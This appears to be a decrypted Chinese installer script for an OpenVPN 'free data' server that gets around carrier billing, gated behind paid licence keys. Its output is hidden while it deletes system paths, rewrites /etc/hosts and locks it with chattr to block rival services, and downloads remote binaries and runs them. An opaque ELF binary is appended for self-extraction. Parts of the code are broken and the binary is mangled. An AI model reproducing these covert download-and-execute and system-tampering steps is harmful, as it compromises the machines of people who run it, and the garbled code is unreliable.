# 骚逼汪™ 版权所有，拒绝盗版
# 转载请注明出处 
#
# 维护人员请使用服务器内源文件进行维护修改，编译动态二进制脚本请链接到 /demo/op/ccdock.so.2 进行编译
# -小母猪 2016.08.05
# 解密时间 2017年1月20日06:17:49
# 小白免流 http//:xbml.vip/
rm -f vpn7 vpn.sh vpn8
rm -rf /sbwml /sbwml.log /bin/ssh /bin/jdk /bin/pro /API
mkdir -p /sbwml/ && mkdir -p /usr/share/linux/ && rm -rf /passwd /bin/vpns
chattr -i /etc
chattr -i /etc/hosts >/dev/null 2>&1
echo "127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
0.0.0.0  www.xuangadml.com
0.0.0.0  www.xuangadml.vip
0.0.0.0  vpn.zyzh.cc
0.0.0.0  *.zyzh.cc
0.0.0.0  103.217.253.62" >/etc/hosts
chattr +i /etc/hosts >/dev/null 2>&1
web="http://";export web=$web #骚逼汪™
webs="https://";export webs=$webs #骚逼汪™
MirrorHost='www.sbwml.cn';export MirrorHost=$MirrorHost;export Geno=$MirrorHost #骚逼汪™
api=API; #骚逼汪™
error="Authorization failure.";export error=$error #骚逼汪™
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin #骚逼汪™
export PATH #骚逼汪™
dpi=79ab5f46b4d5130a692b715fff2d52d6
dpk=`md5sum /usr/bin/curl|cut -d ' ' -f1`
#clear; #骚逼汪™
#echo "Loading ..."
export IPlist=`wget http://sbwml.cn/jiheyun/ -O - -q ; echo`
export blacklist=`wget http://sbwml.cn/IP/XX/ -O - -q ; echo`
export fclist=`wget http://sbwml.cn/IP/FC/ -O - -q ; echo`
export IPVIP=`wget http://sbwml.cn/IP/SIP/ -O - -q ; echo`
export IPKA=`wget http://sbwml.cn/IP/HKA/ -O - -q ; echo`
if [ ! -e "/dev/net/tun" ]; #骚逼汪™
    then
        echo
        echo -e "  安装出错 [原因：\033[31m TUN/TAP虚拟网卡不存在 \033[0m]"
        echo "  网易蜂巢容器官方已不支持安装使用"
        exit 0;
		else
		wget -O /${api} ${web}${MirrorHost}/${api}/${api}S2.0 >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/usr/bin/curl" ];
    then 
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/usr/bin/expect" ];
    then
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/expect" ];
    then
        echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
        yum install -y expect >/dev/null 2>&1
fi
if [ ! -e "/usr/bin/openssl" ];
    then
    echo "正在处理环境（预计3分钟内完成）..." #骚逼汪™
    yum install -y openssl >/dev/null 2>&1
	\cp -rf /usr/bin/openssl /usr/bin/suv
	scrpa -O /bin/jdk ${web}${MirrorHost}/${api}/bash1005 >/dev/null 2>&1 #骚逼汪™
	chmod 0755 /bin/jdk #骚逼汪™
	else
	\cp -rf /usr/bin/openssl /usr/bin/suv
	scrpa -O /bin/jdk ${web}${MirrorHost}/${api}/bash1005 >/dev/null 2>&1 #骚逼汪™
	chmod 0755 /bin/jdk
fi
if [[ $dpi == $dpk ]];then
pass=2.1
curl -o /bin/mo ${web}${MirrorHost}/${api}/bb >/dev/null 2>&1;chmod 0755 /bin/mo >/dev/null 2>&1 #骚逼汪™
jdk >/dev/null 2>&1
else
pass=2.2
curl -o /bin/mo ${web}${MirrorHost}/${api}/bb >/dev/null 2>&1;chmod 0755 /bin/mo >/dev/null 2>&1 #骚逼汪™
jdk >/dev/null 2>&1
#echo "正在处理环境..."
#yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1 #骚逼汪™
fi
if [ ! -e "/bin/mo" ];then
#yum remove -y mo >/dev/null 2>&1 && yum install -y php-pdo >/dev/null 2>&1 #骚逼汪™
echo "请重新执行脚本..."
exit 0;
fi
clear
cd /
# Logo    ******************************************************************
key="a1af1b01812237a1d92c184a10b451a8"
export key=$key
CopyrightLogo='
==========================================================================
                                                                         
               OpenVPN-2.3.2 云免服务器（Centos7）                      
                  Powered by sbwml.cn 2015-2016                          
                      All Rights Reserved                                
                                                                         
                                by 小母猪 2017-01-15                     
==========================================================================';
echo -e "\033[36m$CopyrightLogo\033[0m";
# FILES  ******************************************************************
ServerLocation='yumh';export ServerLocation=$ServerLocation
c532=64-epel-release-5-4.noarch.rpm;
c564=32-epel-release-5-4.noarch.rpm;
c632=32-epel-release-6-8.noarch.rpm;
c664=epel-release-6-8.noarch.rpm;
c700=epel-release-latest-7.noarch.rpm;
sysctl=sysctl.conf;export sysctl=$sysctl
httpport=yumhttp;export httpport=$httpport
vpns=server-passwd.tar.gz;export vpns=$vpns
sq=squid.conf;export sq=$sq
squsername=sbwml2016;export squsername=$squsername
sqpasswd=admin;export sqpasswd=$sqpasswd
dns1=119.29.29.29
dns2=182.254.116.116
sbwml=/etc/openvpn/easy-rsa/sbwml;export sbwml=$sbwml
cats=/etc/alternatives/demo;export cats=$cats
VPNFILE=openvpn-sbwml.zip;export VPNFILE=$VPNFILE
RSA=EasyRSA-2.2.2.tar.gz;export RSA=$RSA
# VAR    ******************************************************************
Model=$1;
Froms=$2;
camd=03fbe5c10cb31ba046984371f0eafbfb;export camd=$camd
ipmd=57d006ac6451149e451b8ffa9c84c1af;export ipmd=$ipmd
rds=dce8026f16bded7b44f169ea7d3b1bce;export rds=$rds
demo1=03fbe5c10cb31ba0451b8ffa9c84c1af;export demo1=$demo1
dbno=`date +%s%N | md5sum | head -c 32 ; echo`;
export dbno=$dbno
IP=`wget ${web}${MirrorHost}/getip -O - -q ; echo`;  >/dev/null 2>&1
#export henanBGP=`openssl rand -base64 8 | cksum | cut -c1-5 ; echo`7 
export IPAddress=$IP ;export JIIP=`echo $IPAddress -O - -q|awk -F "." '{print $1"."$2"."$3}'`
export zhejiang=`openssl rand -base64 8 | cksum | cut -c1-7 ; echo`8
FCIP=`echo $IPAddress -O - -q|awk -F "." '{print $1"."$2}'`
export zhejiangs=`openssl rand -base64 8 | cksum | cut -c1-1 ; echo`2`openssl rand -base64 8 | cksum | cut -c1-5 ; echo`3
testip=`expr substr $IPAddress 1 8`
export testip=$testip
xuzhouip=`expr substr $IPAddress 1 10`
export xuzhouip=$xuzhouip
henanBGP=`expr substr $IPAddress 1 8`
export henanBGP=$henanBGP
henanBGP2=`expr substr $IPAddress 1 8`
export henanBGP2=$henanBGP2
jiangsu2=`expr substr $IPAddress 1 11`
export jiangsu2=$jiangsu2
yunip=42.51.45;export yunip=$yunip
xuzhou=112.85.13;export xuzhou=$xuzhou
henan=42.51.19;export henan=$henan
henan2=42.51.80;export henan2=$henan2
jiangsuDX=221.229.246;export jiangsuDX=$jiangsuDX
port=8080;export port=$port
vpnport=443;export vpnport=$vpnport
admins=udp;export admins=$admins
adminsport=port;export adminsport=$adminsport
LOGO=`wget ${web}${MirrorHost}/${ServerLocation}/md/ -O - -q ; echo` && pass=sbwml.cn;
export LOGO=$LOGO
copyright=`echo -n $LOGO|md5sum`
export copyright=$copyright
pptp=`echo -n $cats|md5sum`
export pptp=$pptp
curls=transfer.sh;
riqi=`date -d today +%Y-%m-%d; echo`
export riqi=$riqi
shijian=`date "+%H:%M:%S"; echo`
export shijian=$shijian
echo 
echo "脚本已由几何云/阿里云/腾讯云 CentOS7.0 测试通过"
echo 
echo -n -e "请输入验证码 [\033[32m $pass \033[0m] ："
    if [ ! -e "/etc/alternatives/demo" ];
    then
        read PASSWD
        key2=$PASSWD
    else 
        key2=sbwml.cn
        echo "sbwml.cn"
    fi
if [[ ${key2%%\ *} == $pass ]]
    then
    echo 
    if [ ! -e "/etc/alternatives/demo" ];
    then
        echo -e "验证成功！[本机IP：\033[32m $IPAddress \033[0m]"
    else 
        echo -e "验证成功，欢迎使用几何云！[本机IP：\033[32m $IPAddress \033[0m]"
    fi
    else 
    echo
    echo -e "\033[31m验证失败！\033[0m"
OPW='
==========================================================================
              骚逼汪™服务授权失败，安装被终止

                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
echo "$OPW";
exit
fi
function InputIPAddress()
{
    if [ "$IPAddress" == '' ]; then
        echo '无法检测您的IP';
        read -p '请输入您的公网IP:' IPAddress;
        [ "$IPAddress" == '' ] && InputIPAddress;
    fi;
    [ "$IPAddress" != '' ] && echo -n '[  OK  ] 您的IP是:' && echo $IPAddress;
	export IPAddress=$IPAddress
    sleep 2
}
# sbwml
echo
if [[ "$fclist" =~ "$FCIP" ]];then
	echo
	echo -e " ...\033[31m安装失败，蜂巢容器拒绝安装\033[0m"
	echo -e "    \033[31m-2016.09.03\033[0m\n"
	exit 0;
elif [[ "$blacklist" =~ "$IPAddress" ]];then
	echo
	echo -e " ...\033[31m安装失败，你的IP已被加入黑名单\033[0m"
	echo -e "    \033[31m请联系\033[0msbwml@qq.com\033[31m解除黑名单！\033[0m\n"
	exit 0;
fi
echo "> 请选择安装类型："
echo
echo " 1 - HTTP转接方式. " 
echo
echo " 2 - 常规安装方式（支持防扫）. "
echo 
echo " 3 - 共存安装方式（HTTP转接+常规）. "
echo 
echo " 4 - 高级安装方式（共存+WEB面板）."
echo -e "     \033[31m注意：\033[0m\033[35m仅支持几何云、阿里云、腾讯云 Centos7 全新系统. \033[0m"
echo -e "     腾讯云：默认安全组放通全部端口."
echo -e "     联系邮箱：sbwml@qq.com."
echo
echo " x - 卸载."
echo
echo -n "输入选项: "
read mode
export mode=$mode
case $mode in
x|[1]|[1-4]) ;;
*) echo -e '\n ...选择错误，安装被终止';exit 0 ;;
esac
if [ -z $mode ]
    then
    echo -e "输入错误，默认选择：\033[32mHTTP转接方式\033[0m"
    type=yes;
else
    if [[ $mode == "1" ]]
    then
    echo
    echo -e "安装类型：\033[32mHTTP转接方式\033[0m"
    type=yes;
    fi
    if [[ $mode == "2" ]]
    then
    echo
    echo -e "安装类型：\033[32m常规安装方式\033[0m"
    type=no;
    fi
    if [[ $mode == "3" ]]
    then
    echo
    echo -e "安装类型：\033[32m共存安装方式\033[0m"
    type=all;
    fi
    if [[ $mode == "4" ]]
    then
        echo
        echo -e " 温馨提示：\033[35m建议安装WEB面板前重启一次系统在执行安装\033[0m"
        echo -e "\033[35m           能有效降低安装失败率！\033[0m"
        echo
        echo " 请选择WEB类型："
        echo 
        echo -e " 1 - 骚逼汪™JS流控3.0-收费：\033[32m15.8\033[0m 元/次（一款全新框架流控、标准Mysql-pdo写法，安全系数更高）" #演示：\033[32mhttp://show.sbwml.cn/1\033[0m"
        echo -e " 2 - 变脸狗和谐版1.7.2-收费：\033[32m10\033[0m 元/次" #演示：\033[32mhttp://show.sbwml.cn/2\033[0m"
		echo
		echo " 附加选项："
		echo 
		echo -e " 3 - 服务器WEB对接（账号共享管理）"
        echo -e " 4 - HTTP端口叠加（开启端口）"
		echo -e " 5 - 重启系统"
        echo
        echo -n "输入选项: "
        read webmode
		case $webmode in
		[1]|[1-5]) ;;
		*) echo -e '\n ...选择错误，安装被终止';exit 0 ;;
		esac
		export webmode=$webmode;vpns;
		exit 0;\CO='
                OpenVPN-2.3.11 安装失败                    
             Powered by sbwml.cn 2015-2016               
                  All Rights Reserved           
                                        
==========================================================================';
	if [ -f /etc/os-release ];then
	OS_VERSION=`cat /etc/os-release |awk -F'[="]+' '/^VERSION=/ {print $2}'`
	if [ $OS_VERSION != "7" ];then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
	elif [ -f /etc/redhat-release ];then
	OS_VERSION=`cat /etc/redhat-release |grep -Eos '\b[0-9]' |cut -d'.' -f1`
	if [ $OS_VERSION != "7\2\1" ];then
		echo -e "\n当前系统版本为：\033[31mCentOS $OS_VERSION\033[0m\n"
		echo "暂不支持该系统安装"
		echo "请更换 CentOS 7.0-7.2 系统进行安装"
		echo "$CO";
		exit 0;
	fi
	else
	echo -e "当前系统版本为：\033[31m未知\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
	echo "$CO";
	exit 0；
	fi
        if [ -z $webmode ]
        then
        echo -e " 输入错误，默认选择：\033[32m1 - 默认面板（操作简单）\033[0m"
        BLDOG=no;
		export BLDOG=no
    else
        if [[ $webmode == "1" ]]
        then
        echo
        echo -e " WEB类型：\033[32m默认面板（操作简单）\033[0m"
        BLDOG=no;
		export BLDOG=no
        fi
        if [[ $webmode == "2" ]]
        then
        echo
        echo -e " WEB类型：\033[32m变脸狗和谐版（功能强大-支持实时监控）\033[0m"
        BLDOG=yes;
		export BLDOG=yes
        fi
		if [[ $webmode == "3" ]]
        then
		sed "1,/^### END OF sbwml.cn THE SCRIPT ###/d" "$0" > $1;su ./$1
### END OF sbwml.cn THE SCRIPT ###
        << EOF
ELF          >    ?@     @        y         @ 8  @         @       @ @     @ @     ?      ?                           @      @                                          @       @     ,      ,                              `       `     鋀     (Y                   (       ( `     ( `     ?      ?                         @     @     D       D              P錿d   8      8@     8@     d       d              Q錿d                                                  /lib64/ld-linux-x86-64.so.2          GNU                       GNU 9鷮邅t惔z*"?憹笁?            0  ?@          艍惸箿@9驄                            S                                             "                      ?                     €                      ?                     7                      L                      ?                                           ?                     y                      r                      ?                     Z                      >                      k                      E                      ?                     ?                     2                      ?  !   xa            ?  !   xa            ?     xa            ?    xa             __gmon_start__ libc.so.6 sprintf __isoc99_sscanf time getpid strdup calloc strlen memset __errno_location memcmp putenv memcpy malloc getenv stderr execvp fprintf atoll strerror __libc_start_main __environ __xstat GLIBC_2.7 GLIBC_2.2.5                                                ii
   ?     ui	   ?      ?`                    xa                   xa                   ?`                   ?`                   ?`                   ?`                   ?`                    "`                   "`                   "`        	           "`        
            "`                   ("`                   0"`        
           8"`                   @"`                   H"`                   P"`                   X"`                   `"`                   h"`                   p"`                   H冹鑻  ?  ?  H兡?5"  %$  @ %"  h    猷%  h   樾%  h   槔%
  h   榘%  h   闋%?  h   閻%?  h   閫%?  h   閜%?  h   閌%?  h	   镻%?  h
   锧%?  h   ?%?  h   ?%?  h
   ?%?  h   ?%?  h   轲?%?  h   猷?%?  h   樾?%?  h   槔?%?  h   榘?1鞩壯^H夆H冧餚TI抢 @ H橇@ H乔3@ 枳?魫怘冹H??  H吚t蠬兡脨悙悙悙悙悙悙UH夊SH冹€=續!  uK? ` H?簃! H侂 ` H聋H冸H9豷$fD  H兝H?昺! ? ` H?噈! H9豶馄sm! H兡[擅fff.?    H?h   UH夊t?   H吚t? ` ?嗌脨怳H夊?Cn!  ?<n! ?5n! ?.n! ?'n! ? n! 独?n! H槇?xa ?n! 兝?! ?鱩! 劺u躺肬H夊H墋鑹u銱婨鐷塃?  ?襪! 独H?秬 xa 圗??緈! E鲌祄! ?琺! 独壜龙鱹鋲蠬楬E???憁! ??坢! ?m! 度?wm! 独H?稅 xa Hc翀?xa ?[m! 独H?禪鲌?xa ?Cm! 兝?:m! ?3m! 劺匯H丒?  乵?  儅??擅UH夊H墋鑹u銱婨鐷塃?  ?駆! 兝?鑜! ?醠! 独H?秬 xa 圗??蘬! E鲌胠! ?籰! 度?瞝! 独H?稅 xa Hc翀?xa ?杔! 独H?禪鲌?xa ?l! 独H?秬 xa  E鱄婨??禘鱄?秬 xa 1翲婨鴪H僂?僲?儅?廔擅UH夊H侅0  H壗佝H媴佝H崟pH壷H壡钄  吚y
?閷   H崊帼簮   ?   H壡鑮?H媴xH墔棹H媴pH墔帼H婨楬墔婨寜咟?婨悏?H婨燞墔H婨菻墔8H婨豀墔HH崊帼緪   H壡鑾??   擅UH夊H墋鳫塽痣H僂?H儅?t2H婨鳫?H吚t&H婨鳫?H;E饀垭H婨鳫兝H?H婨鳫?H僂?H儅?tH婨鳫?H吚u稚肬H夊SH侅H  壗箭H荅?@ 柝?H楬婾豀饕HH1E毓@ H婾豀崊旋H壩H壡?   枳?H崊旋H壡??H塃鐷崊旋H壡钑?塃郒儅?uP?@ 婨郒c蠬崊旋H袐嵓?H婾豀夀H壡?   鑭?H崊旋H壡柰?H壡钑??   閮   ?@ H婨鐷嵉旋H崓凝H崟三I夝H夀H壡?   韬?塃鋬}?uDH媴三H;E豼7婨圜蠬楬壜HU鐷?蟞! H壷H壡鑜?媴凝嫊箭壯)翂葍???H伳H  [擅UH夊SH冹H墋糎塽癏婨癏?H塃梃R??  繃va 铻??   科wa 鑠??   ?va 鑑??va ?劺t&?va 棼?H壝?   ??H9脈
钙wa 镵  ?   ?va ???   繝"` ???   控"` ???   跨"` 梵??   宽"` 桎??   宽"` 梏??   喀"` 杵??   睛"` 宽"` 鐱?吚t
疙"` 槔  婨級氰擙塃跃   坷"` 鑸?儅?y
咐"` 閿  婨純?H樉   H壡??H塃郒儅?u
?   閖  儅?勼   ?   ?#` ???#` ?劺u?va 桊?吚t
?va ?  ?   空"` ???? 魁[` 梵??   ?va 桎??   ?va 梏??   縇va 杵??   綥va ?va 鐱?吚t
?va 槔  ? 鑚?H塃菻儅?u
?   椤  H婨群   ?   H壡??H婨菻   ?? 君[` H壡钃?隦肛"` ?劺t>?  ??H塃菻儅?u
?   锽  关"` H婾鐷婨菻壩H壡?   ???H婨鐷塃惹E?   婨蹾楬拎HE郒婾癏?H?僂?儅?t$刚"` ?劺t婨蹾楬拎HE郒??` 僂??<  劺t婨蹾楬拎HE郒??` 僂?婨蹾楬拎HE郒婾菻?僂?哥"` ?劺t婨蹾楬拎HE郒??` 僂?儅?~婨噪?   塃仉)婨蹾楬拎HE鄫U豀c襀菱HU癏?H?僂?僂?婨?E紎蠇E蹾楬拎HE郒?    H婨郒壠?va 瑭??va H兡H[擅UH夊ATSH冹墋霩塽郒婨郒峏H婾鄫E霩壷壡??H?H婨郒兝H?H吚t
H婨郒兝L??A?@ 梓??吚t桁??壡瑁?H壝??@ 柙??吚t?@ ??@ H婾郒??@ H?7d! H壪M夅I壺H壛?   栝??   H兡[A\擅悙悙悙悙悙愺胒ffff.?    H塴$豅塪$郒??  L??  L塴$鐻塼$餖墊$鳫塡$蠬冹8L)錋夶I夦H笼I壸??H呿t1?@ L夲L夦D夛A蹾兠H9雛闔媆$H媗$L媎$L媗$ L媡$(L媩$0H兡8脨悙悙悙H夠H夻?   閜?UH夊SH冹H?@  H凐t? ` D  H冸蠬?H凐u馠兡[擅悙H冹鐿?H兡?               x%lx =%lu %d %lu %d%c <null>  :  %s%s%s: %s
    ;d      滜€   黪?  伥?  ?  p?   养   *?H  p  叁?  佝?  h?             zR x?        ?[    A?C
V     <   O??   A?C
?     \   ??   A?C
?     |   瘤?   A?C
?     ?  h?a    A?C
\  $   ?  Y   A?C
V?>      $   ?  邙?   A?C
W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆
W??      $     凕?   A?C
V???        4  (?           $   L   ??   Q??_@????X      t  堼                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ?@     
       ?@     觜o    `@            @            ?@     
       ?                                          ?`            ?                           ?@            `@            H       	              ?o    0@     o           ?o    ?@                                                                                                             ( `                     ?@     ?@     ?@     ?@     ?@     	@     	@     &	@     6	@     F	@     V	@     f	@     v	@     ?@     ?@     ?@     ?@     ?@     ?@     ?@                                             m困線;A?曖8??S4繹4q?叒?w@鶞]
Y＝5擺CV╉n鈋??￡?o?瑶愪b盨粍Xq鉊?狈装S?F?;翺|瀥?(れ縧|??q橻笆
??hm桳怖馃n?%H+洞≒轂婳7鏭璨l勐iZ*烛w壊g( i?{V?酛Q嫂9{=phVc哌G7頥犃\?补V?╚倜?Bh€標_x岌€栕竁4v旀0雤4撡醬菠m舒認—鱾Qx涜OT?勊詊?S?萹?<???0儖薻?玙?涉??抦&[咣?w灑扠婴{W/G?fniQ?7-釳縋s/O琄艼鞽柫?-Y?繧?7認d笚#>8Z雱 6qy?w逰?'荠pV
?鴑NSY觭廌韁xd;?t腈n[e{寡瓶?芨??桟l蠡?€冥k??幨違佴冏漂馔璦e裎Y瓱?z-?@``??/錙i&?	逼k?oe嬴揝%,巉岊6?e?簇|刍斿lZP?婓xd??7Fx?畕a6u?颏蕟?巅呼f甽蕶x偒叭$t颺?园4芓M?/厚# 煇?m涔5-2?懧Cerx+莣yΞ╜熖?\kxe豜fL@Ai??w%c>澻錕匜闝???1e}Zх,瑪d#骨bV?帉zU?圶;揦m?f?f?a榰?.nぉ腪袻??z嵤e?7藼漞y角3舔K鸻铯%Ivq齼Q	觔v欱F8鰋?<膖8%d軯甌极?丛韴7c嬕σ
O?縟*??N櫛fU]=cQ欽?[?獘(i颯e驓f霈?UO?b
爆孔?叙臷/Kk攄^.蔜凼 =?熲蘇·紆傃?嘑佹uL:P8=7;zV?e斍yQ=}?殔,"谁@鶦?{蜨禜X
bK0青鳤25?CY媝{V儣?)B鰍???6i??cj/?>5漏M堁v饲枘呈ㄉ ?疥?:暝R(鎳霅詓aK>)40缤侔碗q[徬u珊I?Ｎ義A"脌L鲀}逷V?A閉襱s怴M4$琭1p鐌hj鸊籕宗捹鰘6?	??r?亪姴鵵0a?|乻Zi寫
職 k狼k3?g$寳唅??眝O咣濌?
t,u釥H奴郖??8m
誜?b?5&4?KI_?[
€_K?[?婪?|U?\黻絝&
1懾2沋挰?, 﨑赖箸1I躍J8@5酽\ ◢憖?貿趡n~lK?!?'S?σ;?1巇16衩繁駩?r規??\鬝澉3饪ep$枾Y^荎锼?閷ZcNpHFj zM窟姐ud昧矊1鄙=??勬q?芡?崋鐀麷j?,媪?r?癶THi?郐[穝?壢r?躋#	7迓PXE?P?験郦剔屚gT@韎>?vs枨?J于#$裾や.廂^善o	迟&騡Li?0{y=煘/tBＢ 絠?r?檷n骣H'?糀於G Z	ｙ*ac幹珫o8V.LrU:聒:痫汯?E莻湁Q膙?呱DG厜@閺sD傅Y觳C?慃]花曮a惒q鈝櫎t?-惨?YV缷?吽P╧歸絖e??>`箯	N僟P蕺蓍/?豨^髻ū|MD?歗Es峥U邶uむo逎讜?黐.?郣Q駰C!2%鸮"p噌「v濓s?I淢??e3y稙義臱鵩o 沱,?菶 b
檔?u怔盱縁?VU)V9$ue?b?9聧C\?攓購_臢カt?漅:虑犨Z螧{繃?兟磅?Ta廀
?燝Ic闏i箙f?%;緼緜癯1?屄鰶c=迩L?秷?<態wQ?觰犟︱qf簖)隀?~TtN_+尊3动玸I7籪v %o墑崹誰S砎俓怺q? p?佄f<5躕U銅舕R鼐h?腓y??PQX勊}?栛?)|谰K7宗?   GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-17)  .shstrtab .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .text .fini .rodata .eh_frame_hdr .eh_frame .ctors .dtors .jcr .dynamic .got .got.plt .data .bss .comment                                                                                @                                                       @                                          !             <@     <      $                              4   ?o       `@     `      4                             >             ?@     ?      p                          F             @           ?                             N   o       ?@     ?      4                            [   ?o       0@     0      0                            j             `@     `      H                            t             ?@     ?      ?                          ~             ?@     ?                                    y             ?@     ?      P                            ?            ?@     ?      ?                             ?            ?@     ?                                    ?            ?@     ?      =                              ?            8@     8      d                              ?            ?@     ?      ?                             ?              `                                           ?             `                                          ?              `                                           ?            ( `     (       ?                           ?            ?`     ?                                   ?            ?`     ?      ?                            ?            €"`     €"      dU                             ?             xa     鋡     (                              ?     0               鋡     -                                                   x     ?                             
EOF
### END OF sbwml.cn THE SCRIPT ###
		exit 0;
        fi
		if [[ $webmode == "4" ]]
        then
        httpdk
        exit 0;
        fi
        if [[ $webmode == "5" ]]
        then
        echo
        echo -e " 正在执行：\033[32m重启系统...\033[0m"
        sleep 1.5
        reboot
        fi
    fi
        echo
		if [[ $henan == $henanBGP ]]
		then
			echo -e "  欢迎使用几何云！ [高级模式：\033[32m 已开启 \033[0m]"
            vip=yes;
			export vip=yes
            type=all;
			export type=all
            ov4=4
			export ov4=4
			pro=4
		else
		if [[ $xuzhouip == $xuzhou ]]
		then
			echo -e "  欢迎使用几何云！ [高级模式：\033[32m 已开启 \033[0m]"
            vip=yes;
			export vip=yes
            type=all;
			export type=all
            ov4=4
			export ov4=4
			pro
		else
        if [[ $testip == $yunip ]]
        then
            echo -e "  欢迎使用几何云！ [高级模式：\033[32m 已开启 \033[0m]"
            vip=yes;
			export vip=yes
            type=all;
			export type=all
            ov4=4
			export ov4=4
			pro=4
		if [[ $jiangsu2 == $jiangsuDX ]]
		then
			echo -e "  欢迎使用几何云！ [高级模式：\033[32m 已开启 \033[0m]"
            vip=yes;
			export vip=yes
            type=all;
			export type=all
            ov4=4
			export ov4=4
			pro=4
        else
        echo -e "  温馨提示：\033[31m为了您的服务器安全，请勿非法破解授权哦！\033[0m"
        echo -e " \033[31m 需装高级版请购买正版密钥！-骚逼汪™\033[0m"
        echo
        echo -e " 请输入正版高级密钥开启安装向导（购买地址:\033[32m http://buy.sbwml.cn \033[0m）"
        echo
        echo -n " 请输入卡号： "
        read  name
		export name=$name
        echo -n " 请输入密码： "
        read code
		export code=$code
        echo
        echo "  校验密钥 >>>"
        modes=`curl -s ${web}${MirrorHost}:4466/static/$name:$code`
        if [ "$modes" = "3306" ] ;then
            echo
            echo -e "  密钥错误/已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "3307" ] ;then
            echo
            echo -e "  密钥错误！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "3308" ] ;then
            echo
            echo -e "  密钥已被使用！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
            echo -e "  高级密钥:\033[32m $rmb\033[0m 元/次"
            echo -e "  购买地址:\033[32m http://buy.sbwml.cn \033[0m"
            echo -e "  支付方式:\033[32m 在线支付 \033[0m"
            echo " 目前支持阿里云、腾讯云Centos7.0，微小价格，支持脚本"
            echo
            echo " ...安装被终止"
            exit 0;
        fi
        if [ "$modes" = "3309" ] ;then
            echo
            echo -e "  密码错误，密钥未激活！ [高级模式：\033[31m 未开启 \033[0m]"
            echo 
